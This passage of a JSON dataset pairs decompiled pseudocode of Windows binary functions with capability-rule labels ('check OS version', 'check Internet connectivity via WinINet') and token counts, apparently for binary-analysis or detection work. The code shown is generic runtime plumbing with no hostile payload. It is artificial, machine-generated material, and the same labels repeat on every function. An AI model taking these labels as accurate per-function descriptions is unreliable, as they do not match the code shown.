           }\n            else if (cVar2 == '\\x0e') {\n                fcn.004187ec();\n                fcn.004109f4();\n                fcn.00416ea4();\n            }\n            else {\n                fcn.004177fc();\n                var_24h = 0x4180d6;\n                fcn.00417d40(&stack0xfffffffc);\n            }\n            break;\n        case 0x4180dc:\n            cVar2 = fcn.00416d8c();\n            if (cVar2 == '\\r') {\n                fcn.004187ec();\n                fcn.00410f44();\n            }\n            else {\n                fcn.004177fc();\n                var_14h = (**(*var_4h + 0x18))();\n                var_10h = var_4h[6];\n                if (var_14h != NULL) {\n                    fcn.00410f44();\n                }\n            }\n            break;\n        case 0x418140:\n            var_24h = 0x418146;\n            fcn.00417d80(&stack0xfffffffc);\n            break;\n        case 0x418149:\n            uVar5 = fcn.00417968();\n            var_24h = uVar5;\n            fcn.00410f7c(var_24h, uVar5 >> 0x20);\n            break;\n        case 0x418160:\n            var_24h = 0x418166;\n            fcn.00417ddc(&stack0xfffffffc);\n        }\n    }\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x41819e;\n    fcn.00403fcc();\n    fcn.00404688();\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 1349
    },
    "00418204": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418204(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *in_FS_OFFSET;\n    uint uStackY128;\n    uint uStackY124;\n    uchar *puStackY120;\n    uint uStackY116;\n    uint uStackY112;\n    uchar *puStackY108;\n    uint arg_8h;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    puStack92 = &stack0xfffffffc;\n    uStack72 = 0x41851f;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack80 = 0x41823d;\n    fcn.004185ec();\n    puStack80 = 0x41824c;\n    (**(**0x463848 + 0x14))();\n    uStack84 = 0x4184fd;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    uStack96 = 0x4184be;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    puStack80 = &stack0xfffffffc;\n    (**(*in_EAX + 0x24))();\n    if (param_2 == NULL) {\n        fcn.00418610();\n        iVar1 = fcn.004132c4();\n        var_ch = (**(iVar1 + 0x2c))();\n        fcn.00418610();\n        (**(*var_ch + 0x18))();\n    }\n    else {\n        fcn.00418610();\n        var_ch = param_2;\n        if ((*(param_2 + 7) & 0x10) == 0) {\n            *(param_2 + 7) = *(param_2 + 7) | 1;\n            *(param_2 + 7) = *(param_2 + 7) | 2;\n            fcn.00418610();\n            fcn.004181a4();\n            (**(*param_2 + 0x18))();\n        }\n        else {\n            fcn.00418610();\n        }\n    }\n    in_EAX[6] = var_ch;\n    arg_8h = 1;\n    puStackY108 = 0x41831c;\n    fcn.004031a0();\n    puStackY108 = 0x41832a;\n    iVar1 = fcn.00413014(arg_8h);\n    in_EAX[0x1d] = iVar1;\n    uStackY112 = 0x418463;\n    uStackY116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    in_EAX[7] = var_ch;\n    puStackY120 = 0x41834c;\n    puStackY108 = &stack0xfffffffc;\n    iVar1 = fcn.00405d78();\n    iVar1 = *(iVar1 + 8);\n    if (iVar1 == 0) {\n        puStackY120 = 0x418372;\n        iVar2 = fcn.00403228();\n        in_EAX[0xd] = iVar2;\n    }\n    else {\n        in_EAX[0xd] = iVar1;\n    }\n    uStackY124 = 0x418443;\n    uStackY128 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff80;\n    puStackY120 = &stack0xfffffffc;\n    iVar2 = fcn.00413bc0();\n    if (iVar2 < 0) {\n        fcn.00413a08();\n    }\n    in_EAX[10] = in_EAX[6];\n    *(in_EAX[6] + 0x1c) = *(in_EAX[6] + 0x1c) | 1;\n    *(in_EAX[6] + 0x1c) = *(in_EAX[6] + 0x1c) | 2;\n    (**(*in_EAX[6] + 0x14))();\n    *(in_EAX[6] + 0x1c) = *(in_EAX[6] + 0x1c) & 0xfffd;\n    if ((iVar1 == 0) && (iVar2 = *(in_EAX[0xd] + 8),  -1 < iVar2 + -1)) {\n        do {\n            piVar3 = fcn.00413b64();\n            (**(*piVar3 + 0xc))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStackY128;\n    puStackY120 = 0x41844a;\n    if (iVar1 == 0) {\n        uStackY124 = 0x41843a;\n        fcn.00403258();\n    }\n    in_EAX[0xd] = 0;\n    return;\n}\n",
        "token_count": 1264
    },
    "00418530": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041858f)\n// WARNING: Removing unreachable block (ram,0x0041859e)\n\nvoid fcn.00418530(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    uStack32 = 0x4185da;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x4185ad;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    cVar1 = fcn.004187ec();\n    if (cVar1 != '\\v') {\n        fcn.00416888();\n    }\n    fcn.004108c8();\n    fcn.00418610();\n    *in_FS_OFFSET = uStack48;\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4185e1;\n    uStack32 = 0x4185d9;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 309
    },
    "00418800": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00418800(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uStack20 = 0x41883c;\n    fcn.00418610();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x418843;\n    uStack20 = 0x41883b;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 145
    },
    "00418b88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00418b88(uint param_1)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    fcn.00404040();\n    var_4h = 0;\n    if (*(in_EAX + 0x1c) != 0) {\n        var_4h = fcn.00419a24();\n    }\n    if (var_4h == 0) {\n        if (*(in_EAX + 0x52) != 0) {\n            (**(in_EAX + 0x50))(&var_4h, param_1);\n        }\n        if (var_4h == 0) {\n            var_10h = var_8h;\n            var_ch._0_1_ = 0xb;\n            uVar1 = 0;\n            fcn.0040b630(0, &var_10h);\n            fcn.004039e4();\n        }\n    }\n    *in_FS_OFFSET = uVar1;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 310
    },
    "00418c80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong fcn.00418c80(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iStack12;\n    \n    iStack12 = fcn.00416ce0();\n    if (((iStack12 == 0) && (*(in_EAX + 0x1c) != 0)) && (*(in_EAX + 0x1c) != *(in_EAX + 0x18))) {\n        iStack12 = fcn.00416ce0();\n    }\n    if (*(in_EAX + 0x62) != 0) {\n        (**(in_EAX + 0x60))(&iStack12);\n    }\n    if (iStack12 != 0) {\n        cVar1 = fcn.00403484();\n        if (cVar1 != '\\0') goto code_r0x00418cea;\n    }\n    fcn.00413204();\ncode_r0x00418cea:\n    return CONCAT44(iStack12, iStack12);\n}\n",
        "token_count": 222
    },
    "00419308": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00419308(void)\n\n{\n    sub.kernel32.dll_InitializeCriticalSection_1(0x463868);\n    *0x463850 = sub.kernel32.dll_CreateEventA(0, 0xffffffff, 0, 0x419338);\n    if (*0x463850 == 0) {\n        fcn.0040c9c0();\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "0041937c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041937c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStackY108;\n    uint uStackY104;\n    uchar *puStackY100;\n    uint uStackY96;\n    uint uStackY92;\n    uchar *puStackY88;\n    uint uStackY84;\n    uint uStackY80;\n    uint uStackY76;\n    uchar *puStackY72;\n    uint uStackY68;\n    uint uStackY64;\n    uint uStackY60;\n    uint uStackY56;\n    uchar *puStackY52;\n    uint uStackY48;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_1h;\n    \n    puStackY100 = &fcn.0041937c::var_1h + 1;\n    iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar1 != **0x46220c) {\n        var_14h = sub.kernel32.dll_GetCurrentThreadId_1();\n        var_10h._0_1_ = 0;\n        uStackY48 = 0x4193ba;\n        fcn.0040b630(0, &fcn.0041937c::var_14h);\n        uStackY48 = 0x4193bf;\n        fcn.004039e4();\n    }\n    if (in_EAX < 1) {\n        uStackY48 = 0x4193d1;\n        fcn.00419354();\n    }\n    else {\n        uStackY48 = 0x4193ca;\n        fcn.00419360();\n    }\n    var_ch = 0;\n    uStackY48 = 0x463868;\n    puStackY52 = 0x4193e0;\n    sub.kernel32.dll_EnterCriticalSection_1();\n    uStackY56 = 0x41950a;\n    uStackY60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    uStackY64 = var_ch;\n    uStackY68 = 0x4613e8;\n    puStackY72 = 0x4193fc;\n    puStackY52 = &fcn.0041937c::var_1h + 1;\n    var_ch = sub.kernel32.dll_InterlockedExchange();\n    uStackY76 = 0x4194eb;\n    uStackY80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    if ((var_ch == 0) || (*(var_ch + 8) < 1)) {\n        var_1h._0_1_ = '\\0';\n    }\n    else {\n        var_1h._0_1_ = '\\x01';\n    }\n    if ((var_1h != '\\0') && (0 < *(var_ch + 8))) {\n        uStackY84 = 0x41943e;\n        puStackY72 = &fcn.0041937c::var_1h + 1;\n        var_8h = fcn.00413b64();\n        uStackY84 = 0x41944b;\n        fcn.00413a54();\n        uStackY84 = 0x463868;\n        puStackY88 = 0x419455;\n        sub.kernel32.dll_LeaveCriticalSection_1();\n        uStackY92 = 0x4194b5;\n        uStackY96 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa0;\n        uStackY104 = 0x419486;\n        uStackY108 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff94;\n        puStackY88 = &fcn.0041937c::var_1h + 1;\n        (**(*var_8h + 8))();\n        *in_FS_OFFSET = uStackY108;\n        *in_FS_OFFSET = uStackY96;\n        puStackY88 = 0x4194bc;\n        uStackY92 = 0x463868;\n        uStackY96 = 0x4194b4;\n        sub.kernel32.dll_EnterCriticalSection_1();\n        return;\n    }\n    *in_FS_OFFSET = uStackY80;\n    puStackY72 = 0x4194f2;\n    uStackY76 = 0x4194ea;\n    fcn.00403258();\n    return;\n}\n",
        "token_count": 1024
    },
    "00419568": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00419568(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    char extraout_DL;\n    \n    iVar1 = fcn.004035e4();\n    fcn.004197bc();\n    if (*(iVar1 + 0x14) != 0) {\n        while ((*(iVar1 + 0x14) != 0 && (0 < *(*(iVar1 + 0x14) + 8)))) {\n            piVar2 = fcn.00413b64();\n            (**(*piVar2 + 0x10))();\n        }\n        fcn.0040cf1c();\n    }\n    fcn.00419764();\n    if (*(iVar1 + 4) != 0) {\n        fcn.0041972c();\n    }\n    fcn.004140f4();\n    if ('\\0' < extraout_DL) {\n        fcn.004035cc();\n    }\n    return;\n}\n",
        "token_count": 211
    },
    "004195ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004195ec(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    if ((*(in_EAX + 4) == 0) || (*(in_EAX + 4) != *(param_2 + 4))) {\n        if (*(in_EAX + 0x14) == 0) {\n            uVar1 = fcn.00403228();\n            *(in_EAX + 0x14) = uVar1;\n        }\n        iVar2 = fcn.00413bc0();\n        if (iVar2 < 0) {\n            fcn.00413a08();\n            fcn.004195ec();\n        }\n    }\n    *(in_EAX + 0x1c) = *(in_EAX + 0x1c) | 0x100;\n    return;\n}\n",
        "token_count": 203
    },
    "00419680": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419680(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x10) == 0) {\n        uVar1 = fcn.00403228();\n        *(in_EAX + 0x10) = uVar1;\n    }\n    fcn.00413a08();\n    *(param_2 + 4) = in_EAX;\n    return;\n}\n",
        "token_count": 112
    },
    "004196ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004196ac(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(param_2 + 4) = 0;\n    fcn.00413ca8();\n    if (*(*(in_EAX + 0x10) + 8) == 0) {\n        fcn.00403258();\n        *(in_EAX + 0x10) = 0;\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "004197f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004197f8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x14) != 0) {\n        fcn.00413ca8();\n        if (*(*(in_EAX + 0x14) + 8) == 0) {\n            fcn.00403258();\n            *(in_EAX + 0x14) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "0041998c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041998c(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_EDX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EDX != 0) {\n        cVar1 = fcn.00407c50();\n        if ((cVar1 == '\\0') && (in_EAX == *(in_EDX + 4))) {\n            iVar2 = fcn.00419a24();\n            if (iVar2 != 0) {\n                var_ch = arg_8h;\n                var_8h._0_1_ = 0xb;\n                fcn.0040b630(0, &var_ch);\n                fcn.004039e4();\n            }\n        }\n    }\n    if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 4) != 0)) {\n        (**(**(in_EAX + 4) + 0x20))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 268
    },
    "00419a24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00419a24(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (((param_2 != 0) && (*(in_EAX + 0x10) != 0)) && (iVar3 = *(*(in_EAX + 0x10) + 8),  -1 < iVar3 + -1)) {\n        do {\n            uVar2 = fcn.00413b64();\n            cVar1 = fcn.00407c50();\n            if (cVar1 != '\\0') goto code_r0x00419a69;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    uVar2 = 0;\ncode_r0x00419a69:\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 209
    },
    "00419b14": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00419b14(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x10) == 0) {\n        fcn.00413af0();\n    }\n    fcn.00413b64();\n    return;\n}\n",
        "token_count": 62
    },
    "00419ba4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419ba4(char param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (param_2 == '\\0') {\n        *(in_EAX + 0x1c) = *(in_EAX + 0x1c) & 0xffef;\n    }\n    else {\n        *(in_EAX + 0x1c) = *(in_EAX + 0x1c) | 0x10;\n    }\n    if ((param_1 != '\\0') && (iVar1 = fcn.00419b40(),  -1 < iVar1 + -1)) {\n        do {\n            fcn.00419b14();\n            fcn.00419ba4();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "00419cac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00419cac(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        cVar1 = fcn.0040330c();\n        if (cVar1 == '\\0') {\n            uVar2 = 0x80004002;\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = (****(arg_8h + 0x20))(*(arg_8h + 0x20), arg_ch, arg_10h);\n    }\n    return uVar2;\n}\n",
        "token_count": 162
    },
    "00419e68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00419e68(void)\n\n{\n    int32_t iVar1;\n    char extraout_DL;\n    \n    iVar1 = fcn.004035e4();\n    fcn.00419568();\n    if (*(iVar1 + 0x30) != 0) {\n        fcn.0041981c();\n    }\n    while (0 < *(*(iVar1 + 0x50) + 8)) {\n        fcn.00413c4c();\n        fcn.00419fa8();\n    }\n    fcn.0040cf1c();\n    if ('\\0' < extraout_DL) {\n        fcn.004035cc();\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "00419ef4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00419ef4(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x42) != 0) {\n        (**(in_EAX + 0x40))();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 64
    },
    "00419f10": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00419f10(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x4a) != 0) {\n        (**(in_EAX + 0x48))();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 65
    },
    "0041a094": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041a094(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x41a0e3;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (arg_ch == 0) {\n        uVar1 = 0x80030009;\n        *in_FS_OFFSET = uStack28;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0xc) + 0xc))();\n        if (arg_14h != NULL) {\n            *arg_14h = uVar1;\n        }\n        uVar1 = 0;\n        *in_FS_OFFSET = uStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 229
    },
    "0041a0fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041a0fc(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x41a14b;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (arg_ch == 0) {\n        uVar1 = 0x80030009;\n        *in_FS_OFFSET = uStack28;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0xc) + 0x10))();\n        if (arg_14h != NULL) {\n            *arg_14h = uVar1;\n        }\n        uVar1 = 0;\n        *in_FS_OFFSET = uStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 230
    },
    "0041a24c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0041a24c(int32_t arg_8h, int32_t *arg_ch, uint32_t arg_10h, int32_t arg_14h, uint32_t *arg_18h, uint32_t *arg_1ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack72 = &stack0xfffffffc;\n    puStack60 = 0x41a25d;\n    fcn.004056bc();\n    uStack64 = 0x41a439;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    var_4h = 0;\n    var_18h = 0;\n    var_14h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    uStack76 = 0x41a412;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    if (arg_14h == 0) {\n        if (arg_10h < 0x100001) {\ncode_r0x0041a2b6:\n            var_ch = arg_10h;\n            goto code_r0x0041a2bc;\n        }\n    }\n    else if (arg_14h < 1) goto code_r0x0041a2b6;\n    var_ch = 0x100000;\ncode_r0x0041a2bc:\n    puStack84 = 0x41a2c4;\n    puStack60 = &stack0xfffffffc;\n    var_8h = fcn.004026bc();\n    uStack88 = 0x41a401;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    do {\n        if (arg_14h == 0) {\n            if (arg_10h == 0) {\ncode_r0x0041a3c1:\n                *in_FS_OFFSET = uStack92;\n                puStack84 = 0x41a408;\n                uStack88 = 0x41a3d6;\n                fcn.004026dc();\n                if (arg_1ch != NULL) {\n                    *arg_1ch = var_20h;\n                    arg_1ch[1] = var_1ch;\n                }\n                if (arg_18h != NULL) {\n                    *arg_18h = var_18h;\n                    arg_18h[1] = var_14h;\n                }\n                return;\n            }\n        }\n        else if (arg_14h < 1) goto code_r0x0041a3c1;\n        uVar1 = arg_10h;\n        if (arg_14h == 0) {\n            if (0x7fffffff < arg_10h) {\ncode_r0x0041a2ed:\n                uVar1 = 0x7fffffff;\n            }\n        }\n        else if (0 < arg_14h) goto code_r0x0041a2ed;\n        for (; 0 < uVar1; uVar1 = uVar1 - uVar2) {\n            uVar2 = (**(**(arg_8h + 0xc) + 0xc))();\n            if (uVar2 == 0) {\n                fcn.00403a90();\n                *in_FS_OFFSET = uStack92;\ncode_r0x0041a423:\n                *in_FS_OFFSET = uStack80;\n                puStack72 = 0x41a440;\n                uStack76 = 0x41a438;\n                fcn.00405648();\n                return;\n            }\n            bVar3 = CARRY4(var_18h, uVar2);\n            var_18h = var_18h + uVar2;\n            var_14h = var_14h + (uVar2 >> 0x1f) + bVar3;\n            var_28h = 0;\n            var_24h = 0;\n            var_4h = (**(*arg_ch + 0x10))(arg_ch, var_8h, uVar2, 